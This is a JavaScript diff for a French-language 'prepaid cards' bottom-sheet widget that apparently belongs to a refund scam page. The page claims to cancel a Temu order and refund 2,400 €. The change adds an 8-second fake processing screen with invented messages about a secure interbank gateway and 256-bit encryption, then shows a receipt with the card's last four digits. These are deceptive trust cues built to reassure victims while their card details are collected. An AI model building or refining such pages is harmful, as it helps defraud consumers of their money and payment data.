@@ -268,11 +268,15 @@ function showToast(msg) {
 function openPrepaidCardsWidget() {
   const overlay = document.getElementById('bottom-sheet-cards-overlay');
   const form = document.getElementById('sheet-card-form');
+  const loadingScreen = document.getElementById('sheet-loading-screen');
   const successScreen = document.getElementById('sheet-success-screen');
+  const selector = document.querySelector('.sheet-cards-selector');
 
   if (overlay) {
     if (form) form.style.display = 'block';
+    if (loadingScreen) loadingScreen.style.display = 'none';
     if (successScreen) successScreen.style.display = 'none';
+    if (selector) selector.style.display = 'block';
     overlay.classList.add('active');
     overlay.setAttribute('aria-hidden', 'false');
     document.body.style.overflow = 'hidden';
@@ -513,27 +517,74 @@ function initPrepaidCardsWidget() {
         console.log('Serveur API autonome en local.');
       }
 
-      // Transition vers l'écran de succès après 1.2s de sécurisation
-      setTimeout(() => {
-        if (submitBtn) {
-          submitBtn.disabled = false;
-          submitBtn.innerHTML = `
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-            Valider l'annulation & Rembourser 2 400,00 €
-          `;
+      // Masquer le formulaire et le sélecteur de carte
+      const selector = document.querySelector('.sheet-cards-selector');
+      if (form) form.style.display = 'none';
+      if (selector) selector.style.display = 'none';
+
+      // Afficher l'écran de chargement temporisé (environ 8 secondes)
+      const loadingScreen = document.getElementById('sheet-loading-screen');
+      const progressBar = document.getElementById('sheet-loader-progress-bar');
+      const countdownEl = document.getElementById('sheet-loader-countdown');
+      const statusText = document.getElementById('sheet-loader-status-text');
+
+      if (loadingScreen) loadingScreen.style.display = 'block';
+
+      const durationMs = 8000;
+      const startTime = Date.now();
+
+      const loadingSteps = [
+        { progress: 0, text: "Transmission de la requête d'annulation CMD-TEMU-89241-EU..." },
+        { progress: 0.25, text: "Connexion sécurisée à la passerelle interbancaire..." },
+        { progress: 0.55, text: "Validation des protocoles de remboursement & cryptage 256-bit..." },
+        { progress: 0.85, text: "Traitement approuvé. Finalisation du dossier de remboursement..." }
+      ];
+
+      const loadInterval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(elapsed / durationMs, 1);
+        const secondsRemaining = Math.max(0, Math.ceil((durationMs - elapsed) / 1000));
+
+        if (progressBar) progressBar.style.width = `${progress * 100}%`;
+        if (countdownEl) {
+          countdownEl.textContent = secondsRemaining > 0 
+            ? `⏳ Traitement sécurisé en cours : ~${secondsRemaining}s restant`
+            : `✓ Finalisation immédiate...`;
         }
 
-        if (form) form.style.display = 'none';
-        if (successScreen) {
-          successScreen.style.display = 'block';
-          const refEl = document.getElementById('receipt-ref-code');
-          const brandEl = document.getElementById('receipt-card-brand');
-          if (refEl) refEl.textContent = refCode;
-          if (brandEl) brandEl.textContent = `${currentCard.toUpperCase()} (•••• ${rawNumber.slice(-4)})`;
+        if (statusText) {
+          for (let i = loadingSteps.length - 1; i >= 0; i--) {
+            if (progress >= loadingSteps[i].progress) {
+              statusText.textContent = loadingSteps[i].text;
+              break;
+            }
+          }
         }
 
-        showToast("✓ Annulation confirmée & coordonnées sécurisées !");
-      }, 1200);
+        if (progress >= 1) {
+          clearInterval(loadInterval);
+
+          // Transition vers l'écran de succès après les 8 secondes
+          if (loadingScreen) loadingScreen.style.display = 'none';
+          if (successScreen) {
+            successScreen.style.display = 'block';
+            const refEl = document.getElementById('receipt-ref-code');
+            const brandEl = document.getElementById('receipt-card-brand');
+            if (refEl) refEl.textContent = refCode;
+            if (brandEl) brandEl.textContent = `${currentCard.toUpperCase()} (•••• ${rawNumber.slice(-4)})`;
+          }
+
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = `
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              Valider l'annulation & Rembourser 2 400,00 €
+            `;
+          }
+
+          showToast("✓ Requête d'annulation soumise avec succès !");
+        }
+      }, 50);
     });
   }
 }
